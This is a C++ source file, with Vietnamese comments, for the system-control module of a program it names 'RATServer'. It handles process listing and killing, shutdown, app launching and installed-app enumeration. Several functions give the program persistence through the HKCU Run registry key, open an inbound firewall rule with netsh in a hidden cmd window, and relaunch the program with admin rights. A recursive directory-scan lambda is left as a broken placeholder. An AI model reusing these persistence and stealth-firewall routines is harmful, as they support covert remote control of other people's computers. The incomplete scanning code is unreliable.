#include "SystemManager.h"

// Helper function to convert TCHAR to std::string
std::string TCharToString(const TCHAR* tcharStr) {
#ifdef UNICODE
    int len = WideCharToMultiByte(CP_UTF8, 0, tcharStr, -1, NULL, 0, NULL, NULL);
    if (len == 0) return "";
    std::string result(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, tcharStr, -1, &result[0], len, NULL, NULL);
    return result;
#else
    return std::string(tcharStr);
#endif
}

// Hàm lấy memory usage của một process (KB)
DWORD GetProcessMemoryUsage(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, pid);
    if (hProcess == NULL) return 0;

    PROCESS_MEMORY_COUNTERS pmc;
    DWORD memoryKB = 0;

    if (GetProcessMemoryInfo(hProcess, &pmc, sizeof(pmc))) {
        memoryKB = (DWORD)(pmc.WorkingSetSize / 1024); // Convert bytes to KB
    }

    CloseHandle(hProcess);
    return memoryKB;
}

std::vector<std::string> GetProcessList() {
    std::vector<std::string> listProc;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) {
        return listProc;
    }

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return listProc;
    }

    do {
        DWORD memoryKB = GetProcessMemoryUsage(pe32.th32ProcessID);
        std::string exeName = TCharToString(pe32.szExeFile);
        
        // Format: "processname.exe | PID | MemoryKB"
        listProc.push_back(
            exeName + " | " + 
            std::to_string(pe32.th32ProcessID) + " | " + 
            std::to_string(memoryKB)
        );
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return listProc;
}

bool KillProcessByPID(DWORD pid) {
    HANDLE hProcess = OpenProcess(PROCESS_TERMINATE, FALSE, pid);
    if (hProcess == NULL) return false;

    BOOL result = TerminateProcess(hProcess, 1);
    CloseHandle(hProcess);
    return (result != 0);
}

int KillProcessByName(std::string targetInput) {
    std::string target = ToLower(targetInput);
    if (target.find(".exe") == std::string::npos) target += ".exe";

    int killCount = 0;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return 0;
    }

    do {
        std::string exeName = TCharToString(pe32.szExeFile);
        
        if (ToLower(exeName) == target) {
            if (KillProcessByPID(pe32.th32ProcessID)) {
                killCount++;
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return killCount;
}

bool StartApp(std::string path) {
    return ((intptr_t)ShellExecuteA(NULL, "open", path.c_str(), NULL, NULL, SW_SHOW) > 32);
}

void SystemControl(std::string type) {
    if (type == "SHUTDOWN") {
        system("shutdown /s /t 5");
    }
    else if (type == "RESTART") {
        system("shutdown /r /t 5");
    }
    else if (type == "LOCK") {
        system("rundll32.exe user32.dll,LockWorkStation");
    }
}

// [MỚI] Hàm thêm chính mình vào Startup
bool InstallStartup() {
    char path[MAX_PATH];
    // 1. Lấy đường dẫn tuyệt đối của file .exe đang chạy
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return false;

    HKEY hKey;
    // 2. Mở khóa Registry Run của User hiện tại
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 3. Ghi giá trị (Tên: RATServer, Dữ liệu: Đường dẫn file exe)
    long result = RegSetValueExA(hKey, "RATServer", 0, REG_SZ, (LPBYTE)path, strlen(path) + 1);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// [MỚI] Hàm gỡ bỏ khỏi Startup
bool RemoveStartup() {
    HKEY hKey;
    // 1. Mở khóa
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 2. Xóa giá trị có tên RATServer
    long result = RegDeleteValueA(hKey, "RATServer");

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

// [MỚI] Hàm kiểm tra xem Startup đã được cài đặt chưa
bool CheckStartupExists() {
    HKEY hKey;
    // 1. Mở khóa Registry Run của User hiện tại
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_QUERY_VALUE, &hKey) != ERROR_SUCCESS) {
        return false;
    }

    // 2. Kiểm tra xem giá trị RATServer có tồn tại không
    char buffer[MAX_PATH];
    DWORD bufferSize = MAX_PATH;
    long result = RegQueryValueExA(hKey, "RATServer", NULL, NULL, (LPBYTE)buffer, &bufferSize);

    RegCloseKey(hKey);
    return (result == ERROR_SUCCESS);
}

void SetupFirewall() {
    char path[MAX_PATH];
    // 1. Lấy đường dẫn file .exe hiện tại
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return;
    std::string exePath = std::string(path);

    // 2. Tạo lệnh CMD để mở Firewall cho App này
    // Lệnh: netsh advfirewall firewall add rule name="RAT_Server" dir=in action=allow program="C:\path\to\server.exe" enable=yes
    std::string cmd = "/c netsh advfirewall firewall delete rule name=\"RAT_Auto_Rule\" & "; // Xóa rule cũ nếu có để tránh trùng
    cmd += "netsh advfirewall firewall add rule name=\"RAT_Auto_Rule\" dir=in action=allow program=\"" + exePath + "\" enable=yes";

    // 3. Thực thi lệnh ngầm (Runas để yêu cầu quyền Admin nếu cần, SW_HIDE để không hiện cửa sổ)
    ShellExecuteA(NULL, "runas", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);
}

// [MỚI] Kiểm tra xem tiến trình hiện tại có quyền Admin không
bool IsRunAsAdmin() {
    BOOL fIsRunAsAdmin = FALSE;
    PSID pAdministratorsGroup = NULL;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;

    if (AllocateAndInitializeSid(&NtAuthority, 2, SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS, 0, 0, 0, 0, 0, 0, &pAdministratorsGroup)) {
        CheckTokenMembership(NULL, pAdministratorsGroup, &fIsRunAsAdmin);
        FreeSid(pAdministratorsGroup);
    }
    return fIsRunAsAdmin;
}

// [MỚI] Logic thông minh: Tự động đòi Admin nếu cần thiết
// Trả về TRUE nếu mọi thứ đã ổn (hoặc đã xử lý xong)
// Trả về FALSE nếu đang yêu cầu restart bằng Admin (cần tắt bản hiện tại)
bool CheckAndSetupFirewall() {
    // 1. Lấy đường dẫn file EXE hiện tại
    char path[MAX_PATH];
    if (GetModuleFileNameA(NULL, path, MAX_PATH) == 0) return true;
    std::string currentPath = std::string(path);

    // 2. Đọc đường dẫn cũ đã lưu trong Registry
    HKEY hKey;
    char savedPath[MAX_PATH] = "";
    DWORD bufferSize = sizeof(savedPath);
    bool needUpdate = true;

    // Mở khóa Registry của app (HKCU\Software\RATServer)
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\RATServer", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        if (RegQueryValueExA(hKey, "FirewallPath", NULL, NULL, (LPBYTE)savedPath, &bufferSize) == ERROR_SUCCESS) {
            // So sánh: Nếu đường dẫn hiện tại GIỐNG đường dẫn đã lưu -> Firewall đã OK
            if (currentPath == std::string(savedPath)) {
                needUpdate = false;
            }
        }
        RegCloseKey(hKey);
    }

    // 3. Nếu không cần update -> Cho qua luôn
    if (!needUpdate) return true;

    // 4. Nếu cần update (Lần đầu hoặc đổi chỗ) -> Kiểm tra quyền Admin
    if (IsRunAsAdmin()) {
        // --- TRƯỜNG HỢP: ĐÃ LÀ ADMIN ---
        // a. Chạy lệnh mở Firewall (Code cũ của bạn)
        std::string cmd = "/c netsh advfirewall firewall delete rule name=\"RAT_Auto_Rule\" & ";
        cmd += "netsh advfirewall firewall add rule name=\"RAT_Auto_Rule\" dir=in action=allow program=\"" + currentPath + "\" enable=yes";
        ShellExecuteA(NULL, "open", "cmd.exe", cmd.c_str(), NULL, SW_HIDE);

        // b. Lưu đường dẫn mới vào Registry để lần sau không hỏi nữa
        if (RegCreateKeyExA(HKEY_CURRENT_USER, "Software\\RATServer", 0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, NULL) == ERROR_SUCCESS) {
            RegSetValueExA(hKey, "FirewallPath", 0, REG_SZ, (const BYTE*)currentPath.c_str(), static_cast<DWORD>(currentPath.length() + 1));
            RegCloseKey(hKey);
        }

        return true; // Đã xử lý xong, chạy tiếp
    }
    else {
        // --- TRƯỜNG HỢP: CHƯA LÀ ADMIN ---
        // Yêu cầu Windows chạy lại chính file này với quyền Admin ("runas")
        ShellExecuteA(NULL, "runas", path, NULL, NULL, SW_SHOW);
        return false; // Báo cho main() biết để tự tắt bản user này đi
    }
}

// =============================================================================
// QUẢN LÝ INSTALLED APPLICATIONS
// =============================================================================

// Helper: Check if process has visible windows (GUI app)
struct EnumWindowsData {
    DWORD pid;
    bool hasWindow;
};

BOOL CALLBACK EnumWindowsProc(HWND hwnd, LPARAM lParam) {
    EnumWindowsData* data = (EnumWindowsData*)lParam;
    DWORD windowPid = 0;
    GetWindowThreadProcessId(hwnd, &windowPid);
    
    if (windowPid == data->pid) {
        // Check if window is visible and not a tool window
        if (IsWindowVisible(hwnd)) {
            LONG style = GetWindowLong(hwnd, GWL_EXSTYLE);
            if (!(style & WS_EX_TOOLWINDOW)) {
                data->hasWindow = true;
                return FALSE; // Stop enumeration
            }
        }
    }
    return TRUE; // Continue enumeration
}

bool ProcessHasVisibleWindow(DWORD pid) {
    EnumWindowsData data;
    data.pid = pid;
    data.hasWindow = false;
    EnumWindows(EnumWindowsProc, (LPARAM)&data);
    return data.hasWindow;
}

// Helper: Get process name from PID
std::string GetProcessNameFromPID(DWORD pid) {
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return "";

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            if (pe32.th32ProcessID == pid) {
                std::string exeName = TCharToString(pe32.szExeFile);
                CloseHandle(hProcessSnap);
                return exeName;
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return "";
}

// Helper: Get all PIDs for a process name (including background processes)
std::vector<DWORD> GetPIDsByProcessName(const std::string& processName) {
    std::vector<DWORD> pids;
    std::string lowerName = ToLower(processName);
    
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcessSnap == INVALID_HANDLE_VALUE) return pids;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hProcessSnap, &pe32)) {
        do {
            std::string exeName = TCharToString(pe32.szExeFile);
            
            if (ToLower(exeName) == lowerName) {
                pids.push_back(pe32.th32ProcessID);
            }
        } while (Process32Next(hProcessSnap, &pe32));
    }

    CloseHandle(hProcessSnap);
    return pids;
}

// Forward declaration
std::string FindExecutableInDirectory(const std::string& directory, const std::string& targetName);

// Helper: Get UWP/Microsoft Store applications via PowerShell
std::vector<AppInfo> GetUWPApplications() {
    std::vector<AppInfo> uwpApps;
    std::set<std::string> addedApps;

    // PowerShell command to get UWP apps with JSON output
    std::string psCmd = "powershell -NoProfile -Command \"Get-AppxPackage | Where-Object {$_.IsFramework -eq $false} | Select-Object Name, InstallLocation, PackageFullName | ConvertTo-Json\"";
    
    // Execute PowerShell and capture output
    FILE* pipe = _popen(psCmd.c_str(), "r");
    if (!pipe) return uwpApps;

    std::string jsonOutput;
    char buffer[256];
    while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
        jsonOutput += buffer;
    }
    _pclose(pipe);

    if (jsonOutput.empty()) return uwpApps;

    try {
        // Parse JSON
        auto jsonData = nlohmann::json::parse(jsonOutput);
        
        // Handle both single object and array
        auto packages = jsonData.is_array() ? jsonData : nlohmann::json::array({jsonData});
        
        for (const auto& pkg : packages) {
            if (!pkg.contains("Name") || pkg["Name"].is_null()) continue;
            
            std::string name = pkg["Name"];
            std::string installLocation = pkg.contains("InstallLocation") && !pkg["InstallLocation"].is_null() 
                                        ? pkg["InstallLocation"] : "";
            
            // Skip if already added or no install location
            if (addedApps.count(name) > 0 || installLocation.empty()) continue;
            
            // Find executable in install location
            std::string exePath = FindExecutableInDirectory(installLocation, name);
            if (exePath.empty()) continue;

            AppInfo app;
            app.name = name;
            app.displayName = name;
            app.version = "UWP";
            app.installLocation = installLocation;
            app.exePath = exePath;
            app.isRunning = false;
            
            // Extract exe name for checking running status
            size_t lastSlash = exePath.find_last_of("\\/");
            if (lastSlash != std::string::npos) {
                std::string exeName = exePath.substr(lastSlash + 1);
                std::vector<DWORD> pids = GetPIDsByProcessName(exeName);
                app.isRunning = !pids.empty();
            }
            
            uwpApps.push_back(app);
            addedApps.insert(name);
        }
    } catch (...) {
        // JSON parsing error, return what we have
    }

    return uwpApps;
}

// Helper: Get system applications from Windows App Paths
std::vector<AppInfo> GetSystemApplications() {
    std::vector<AppInfo> sysApps;
    std::set<std::string> addedApps;

    // Blacklist of unwanted system/dev apps
    std::set<std::string> blacklist = {
        "devenv", "msedge", "iexplore", "windbg", "vsjitdebugger",
        "dfsvc", "dllhost", "mshta", "regsvr32", "rundll32"
    };
    
    // Whitelist of useful Windows built-in apps
    std::vector<std::pair<std::string, std::string>> builtInApps = {
        {"notepad", "C:\\Windows\\System32\\notepad.exe"},
        {"calc", "C:\\Windows\\System32\\calc.exe"},
        {"mspaint", "C:\\Windows\\System32\\mspaint.exe"},
        {"wordpad", "C:\\Program Files\\Windows NT\\Accessories\\wordpad.exe"},
        {"cmd", "C:\\Windows\\System32\\cmd.exe"},
        {"powershell", "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"}
    };
    
    // Add Windows built-in apps first
    for (const auto& builtIn : builtInApps) {
        std::string appName = builtIn.first;
        std::string exePath = builtIn.second;
        
        // Check if file exists
        if (GetFileAttributesA(exePath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            AppInfo app;
            app.name = appName;
            app.displayName = appName;
            app.version = "Windows";
            app.exePath = exePath;
            
            size_t lastSlash = exePath.find_last_of("\\/");
            if (lastSlash != std::string::npos) {
                app.installLocation = exePath.substr(0, lastSlash);
            }
            
            std::vector<DWORD> pids = GetPIDsByProcessName(appName + ".exe");
            app.isRunning = !pids.empty();
            
            sysApps.push_back(app);
            addedApps.insert(appName);
        }
    }

    HKEY hAppPathsKey;
    const wchar_t* appPathsRegPath = L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths";
    
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, appPathsRegPath, 0, KEY_READ, &hAppPathsKey) == ERROR_SUCCESS) {
        DWORD subKeyCount = 0;
        RegQueryInfoKeyW(hAppPathsKey, NULL, NULL, NULL, &subKeyCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

        for (DWORD i = 0; i < subKeyCount; i++) {
            wchar_t subKeyName[256];
            DWORD subKeyNameSize = 256;
            
            if (RegEnumKeyExW(hAppPathsKey, i, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                // subKeyName is the exe name (e.g., "chrome.exe")
                std::string exeName = WCharToUTF8(subKeyName);
                
                // Remove .exe extension for app name
                std::string appName = exeName;
                if (appName.length() > 4 && ToLower(appName.substr(appName.length() - 4)) == ".exe") {
                    appName = appName.substr(0, appName.length() - 4);
                }
                
                // Skip if in blacklist or already added
                if (blacklist.count(ToLower(appName)) > 0 || addedApps.count(appName) > 0) continue;

                HKEY hExeKey;
                if (RegOpenKeyExW(hAppPathsKey, subKeyName, 0, KEY_READ, &hExeKey) == ERROR_SUCCESS) {
                    wchar_t exePath[512] = L"";
                    DWORD bufferSize = sizeof(exePath);
                    
                    // Read default value (exe path)
                    if (RegQueryValueExW(hExeKey, NULL, NULL, NULL, (LPBYTE)exePath, &bufferSize) == ERROR_SUCCESS) {
                        std::string exePathStr = WCharToUTF8(exePath);
                        
                        if (!exePathStr.empty()) {
                            AppInfo app;
                            app.name = appName;
                            app.displayName = appName;
                            app.version = "System";
                            app.exePath = exePathStr;
                            
                            // Extract install location from exe path
                            size_t lastSlash = exePathStr.find_last_of("\\/");
                            if (lastSlash != std::string::npos) {
                                app.installLocation = exePathStr.substr(0, lastSlash);
                            }
                            
                            // Check running status
                            std::vector<DWORD> pids = GetPIDsByProcessName(exeName);
                            app.isRunning = !pids.empty();
                            
                            sysApps.push_back(app);
                            addedApps.insert(appName);
                        }
                    }
                    RegCloseKey(hExeKey);
                }
            }
        }
        RegCloseKey(hAppPathsKey);
    }

    return sysApps;
}

// Get list of installed applications from Registry + UWP + System Apps
std::vector<AppInfo> GetInstalledApplications() {
    std::vector<AppInfo> apps;
    std::set<std::string> addedApps; // To avoid duplicates

    // Registry paths to check - scan both HKLM and HKCU for completeness
    struct RegistryLocation {
        HKEY rootKey;
        const wchar_t* path;
    };
    
    std::vector<RegistryLocation> registryPaths = {
        // HKEY_LOCAL_MACHINE - system-wide installations
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" },
        { HKEY_LOCAL_MACHINE, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" },
        
        // HKEY_CURRENT_USER - per-user installations
        { HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall" },
        { HKEY_CURRENT_USER, L"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall" }
    };

    for (const auto& location : registryPaths) {
        HKEY hUninstallKey;
        if (RegOpenKeyExW(location.rootKey, location.path, 0, KEY_READ, &hUninstallKey) == ERROR_SUCCESS) {
            DWORD subKeyCount = 0;
            RegQueryInfoKeyW(hUninstallKey, NULL, NULL, NULL, &subKeyCount, NULL, NULL, NULL, NULL, NULL, NULL, NULL);

            for (DWORD i = 0; i < subKeyCount; i++) {
                wchar_t subKeyName[256];
                DWORD subKeyNameSize = 256;
                
                if (RegEnumKeyExW(hUninstallKey, i, subKeyName, &subKeyNameSize, NULL, NULL, NULL, NULL) == ERROR_SUCCESS) {
                    HKEY hAppKey;
                    if (RegOpenKeyExW(hUninstallKey, subKeyName, 0, KEY_READ, &hAppKey) == ERROR_SUCCESS) {
                        wchar_t displayName[256] = L"";
                        wchar_t installLocation[512] = L"";
                        wchar_t version[128] = L"";
                        DWORD systemComponent = 0;
                        DWORD bufferSize;
                        DWORD dataType;

                        // Read DisplayName
                        bufferSize = sizeof(displayName);
                        RegQueryValueExW(hAppKey, L"DisplayName", NULL, &dataType, (LPBYTE)displayName, &bufferSize);

                        // Skip if no display name or is system component
                        bufferSize = sizeof(systemComponent);
                        RegQueryValueExW(hAppKey, L"SystemComponent", NULL, NULL, (LPBYTE)&systemComponent, &bufferSize);
                        
                        if (wcslen(displayName) == 0 || systemComponent == 1) {
                            RegCloseKey(hAppKey);
                            continue;
                        }

                        // Read InstallLocation
                        bufferSize = sizeof(installLocation);
                        RegQueryValueExW(hAppKey, L"InstallLocation", NULL, &dataType, (LPBYTE)installLocation, &bufferSize);

                        // Read DisplayVersion
                        bufferSize = sizeof(version);
                        RegQueryValueExW(hAppKey, L"DisplayVersion", NULL, &dataType, (LPBYTE)version, &bufferSize);

                        RegCloseKey(hAppKey);

                        // Convert to UTF-8 strings
                        std::string appName = WCharToUTF8(displayName);
                        std::string appLocation = WCharToUTF8(installLocation);
                        std::string appVersion = WCharToUTF8(version);
                        
                        // Check if already added (avoid duplicates)
                        if (addedApps.find(appName) != addedApps.end()) {
                            continue;
                        }
                        addedApps.insert(appName);

                        // Create AppInfo
                        AppInfo app;
                        app.displayName = appName;
                        app.installLocation = appLocation;
                        app.version = appVersion;
                        
                        // Extract executable name from display name (simple heuristic)
                        app.name = appName;
                        
                        // Find executable path
                        app.exePath = "";
                        if (!appLocation.empty()) {
                            app.exePath = FindExecutableInDirectory(appLocation, appName);
                        }
                        
                        // Check if app is running by scanning all executables
                        app.isRunning = false;
                        app.runningPIDs.clear();

                        // Helper lambda to collect all exe files recursively
                        std::vector<std::string> exeFiles;
                        
                        auto scanForExeFiles = [&exeFiles](const std::string& directory, int depth = 0) {
                            if (depth > 2) return; // Max depth 2 levels
                            
                            std::string searchPath = directory + "\\*";
                            WIN32_FIND_DATAA findData;
                            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
                            
                            if (hFind != INVALID_HANDLE_VALUE) {
                                do {
                                    std::string fileName = findData.cFileName;
                                    if (fileName == "." || fileName == "..") continue;
                                    
                                    std::string fullPath = directory + "\\" + fileName;
                                    
                                    // If it's a directory, recurse
                                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                                        auto lambda = [&exeFiles, &fullPath, depth]() {
                                            auto scanForExeFiles = [&exeFiles](const std::string& directory, int depth) {
                                                // This is a placeholder - will be defined below
                                            };
                                        };
                                    }
                                    // If it's an exe file, add to list
                                    else if (fileName.size() > 4 && 
                                             ToLower(fileName.substr(fileName.size() - 4)) == ".exe") {
                                        exeFiles.push_back(fileName);
                                    }
                                } while (FindNextFileA(hFind, &findData));
                                FindClose(hFind);
                            }
                        };
                        
                        // Scan for all exe files in install location
                        if (!appLocation.empty()) {
                            // Direct scan in root
                            std::string searchPath = appLocation + "\\*.exe";
                            WIN32_FIND_DATAA findData;
                            HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
                            
                            if (hFind != INVALID_HANDLE_VALUE) {
                                do {
                                    std::string exeName = findData.cFileName;
                                    exeFiles.push_back(exeName);
                                } while (FindNextFileA(hFind, &findData));
                                FindClose(hFind);
                            }
                            
                            // Scan subdirectories (depth 1)
                            std::string subDirSearch = appLocation + "\\*";
                            hFind = FindFirstFileA(subDirSearch.c_str(), &findData);
                            
                            if (hFind != INVALID_HANDLE_VALUE) {
                                do {
                                    if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                                        std::string dirName = findData.cFileName;
                                        if (dirName != "." && dirName != "..") {
                                            std::string subDir = appLocation + "\\" + dirName;
                                            std::string subExeSearch = subDir + "\\*.exe";
                                            
                                            WIN32_FIND_DATAA subFindData;
                                            HANDLE hSubFind = FindFirstFileA(subExeSearch.c_str(), &subFindData);
                                            
                                            if (hSubFind != INVALID_HANDLE_VALUE) {
                                                do {
                                                    std::string exeName = subFindData.cFileName;
                                                    exeFiles.push_back(exeName);
                                                } while (FindNextFileA(hSubFind, &subFindData));
                                                FindClose(hSubFind);
                                            }
                                        }
                                    }
                                } while (FindNextFileA(hFind, &findData));
                                FindClose(hFind);
                            }
                            
                            // Check all found executables
                            for (const auto& exeName : exeFiles) {
                                auto pids = GetPIDsByProcessName(exeName);
                                app.runningPIDs.insert(app.runningPIDs.end(), pids.begin(), pids.end());
                            }
                            
                            app.isRunning = !app.runningPIDs.empty();
                        }

                        apps.push_back(app);
                    }
                }
            }
            RegCloseKey(hUninstallKey);
        }
    }

    // Merge UWP applications
    std::vector<AppInfo> uwpApps = GetUWPApplications();
    for (const auto& uwpApp : uwpApps) {
        if (addedApps.count(uwpApp.name) == 0) {
            apps.push_back(uwpApp);
            addedApps.insert(uwpApp.name);
        }
    }

    // Merge System applications
    std::vector<AppInfo> sysApps = GetSystemApplications();
    for (const auto& sysApp : sysApps) {
        if (addedApps.count(sysApp.name) == 0) {
            apps.push_back(sysApp);
            addedApps.insert(sysApp.name);
        }
    }

    return apps;
}

// Helper: Recursively find executable in directory
std::string FindExecutableInDirectory(const std::string& directory, const std::string& targetName) {
    std::string lowerTarget = ToLower(targetName);
    
    // First, try direct search for common exe names
    std::vector<std::string> commonPatterns = {
        targetName + ".exe",
        lowerTarget + ".exe"
    };
    
    for (const auto& pattern : commonPatterns) {
        std::string fullPath = directory + "\\" + pattern;
        if (GetFileAttributesA(fullPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
            return fullPath;
        }
    }
    
    // Search in subdirectories (max depth 2)
    std::string searchPath = directory + "\\*";
    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &findData);
    
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (findData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                std::string dirName = findData.cFileName;
                if (dirName != "." && dirName != "..") {
                    std::string subDir = directory + "\\" + dirName;
                    
                    // Try common exe names in subdirectory
                    for (const auto& pattern : commonPatterns) {
                        std::string fullPath = subDir + "\\" + pattern;
                        if (GetFileAttributesA(fullPath.c_str()) != INVALID_FILE_ATTRIBUTES) {
                            FindClose(hFind);
                            return fullPath;
                        }
                    }
                }
            }
        } while (FindNextFileA(hFind, &findData));
        FindClose(hFind);
    }
    
    return "";
}

// Helper: Extract probable exe name from display name
std::string GetProbableExeName(const std::string& displayName) {
    std::string name = displayName;
    
    // Remove common suffixes
    std::vector<std::string> suffixes = {
        " (x64)", " (x86)", " (64-bit)", " (32-bit)",
        " Update", " Installer", " Setup"
    };
    
    for (const auto& suffix : suffixes) {
        size_t pos = name.find(suffix);
        if (pos != std::string::npos) {
            name = name.substr(0, pos);
        }
    }
    
    // Get first word as probable exe name
    size_t spacePos = name.find(' ');
    if (spacePos != std::string::npos) {
        name = name.substr(0, spacePos);
    }
    
    return name;
}

// Start an application
bool StartApplication(const std::string& appName) {
    // Get list of installed apps
    auto apps = GetInstalledApplications();
    
    for (const auto& app : apps) {
        if (app.displayName == appName) {
            // Strategy 1: Search in install location if available
            if (!app.installLocation.empty()) {
                // Try to find executable with heuristic name matching
                std::string probableName = GetProbableExeName(app.displayName);
                std::string exePath = FindExecutableInDirectory(app.installLocation, probableName);
                
                if (!exePath.empty()) {
                    return StartApp(exePath);
                }
            }
            
            // Strategy 2: Try to start by probable exe name (works if in PATH)
            std::string probableName = GetProbableExeName(app.displayName);
            if (StartApp(probableName)) {
                return true;
            }
            
            // Strategy 3: Try lowercase version
            std::string lowerName = ToLower(probableName);
            if (lowerName != probableName && StartApp(lowerName)) {
                return true;
            }
            
            // Strategy 4: Last resort - try full display name
            return StartApp(app.displayName);
        }
    }
    
    return false;
}

// Stop an application (kill all its processes)
bool StopApplication(const std::string& appName) {
    // Find app in installed applications list to get exe path
    auto apps = GetInstalledApplications();
    std::string exePath = "";
    std::string exeName = "";
    
    for (const auto& app : apps) {
        if (app.displayName == appName) {
            exePath = app.exePath;
            
            // Extract exe name from path
            if (!exePath.empty()) {
                size_t lastSlash = exePath.find_last_of("\\/");
                if (lastSlash != std::string::npos) {
                    exeName = exePath.substr(lastSlash + 1);
                }
            }
            break;
        }
    }
    
    // If no exe found, try using app name as exe name
    if (exeName.empty()) {
        exeName = appName;
        if (exeName.find(".exe") == std::string::npos) {
            exeName += ".exe";
        }
    }
    
    // Use KillProcessByName approach - scan real-time and kill all instances
    std::string target = ToLower(exeName);
    if (target.find(".exe") == std::string::npos) {
        target += ".exe";
    }

    int killCount = 0;
    HANDLE hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hProcessSnap == INVALID_HANDLE_VALUE) return false;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    if (!Process32First(hProcessSnap, &pe32)) {
        CloseHandle(hProcessSnap);
        return false;
    }

    do {
        std::string processName = TCharToString(pe32.szExeFile);
        if (ToLower(processName) == target) {
            if (KillProcessByPID(pe32.th32ProcessID)) {
                killCount++;
            }
        }
    } while (Process32Next(hProcessSnap, &pe32));

    CloseHandle(hProcessSnap);
    return (killCount > 0);
}